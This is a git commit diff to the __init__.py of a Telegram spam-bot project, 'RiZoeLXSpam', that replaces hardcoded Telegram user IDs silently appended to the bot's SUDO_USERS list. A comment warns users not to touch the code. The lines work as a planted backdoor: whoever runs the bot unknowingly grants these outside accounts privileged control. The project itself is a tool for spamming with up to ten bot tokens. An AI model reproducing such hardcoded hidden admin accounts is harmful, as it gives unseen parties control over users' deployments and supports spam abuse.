b91bfe3d7da4ed8eb0f961ee7884603e9e692b1e
тєcнησ✘ρяσ <83203983+Titan-OP@users.noreply.github.com>
2022-04-01 21:23:08 +0530

    Update __init__.py

--- RiZoeLXSpam/__init__.py
+++ RiZoeLXSpam/__init__.py
@@ -38,15 +38,15 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 5259070028 not in SUDO_USERS:
+    SUDO_USERS.append(5259070028)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(1789859817)
+SUDO_USERS.append(5115906599)
 
 # Tokens
 
